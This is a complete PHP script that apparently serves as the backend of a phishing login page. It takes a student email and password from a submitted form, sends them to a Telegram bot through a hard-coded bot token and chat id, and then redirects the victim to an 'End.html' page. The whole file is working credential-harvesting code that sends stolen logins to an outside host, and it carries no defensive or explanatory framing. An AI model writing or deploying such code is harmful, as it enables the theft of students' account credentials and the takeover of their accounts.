<?php

$email = $_POST['student_email'];
$password = $_POST['student_password'];
$token = "5173800973:AAGY0z1I6HWc8P78HrTkRA21x2WeVvOOpaw";
$chat_id = "-786480076";
$arr = array(
    'Email' => $email,
    'Password' => $password
);

foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
    header('Location: End.html');
} else {
    echo "Error";
}
?>